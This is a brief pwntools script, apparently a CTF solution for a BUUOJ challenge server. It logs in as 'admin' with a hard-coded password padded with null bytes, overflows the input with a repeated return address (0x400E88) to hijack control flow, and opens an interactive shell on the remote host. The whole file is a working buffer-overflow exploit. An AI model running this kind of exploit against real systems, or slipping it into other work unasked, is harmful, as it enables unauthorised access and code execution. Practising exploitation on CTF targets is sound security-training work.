from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26270)
io.sendline(b'admin')
io.sendline(b'2jctf_pa5sw0rd\x00\x00' + p64(0x400E88) * 8)
io.interactive()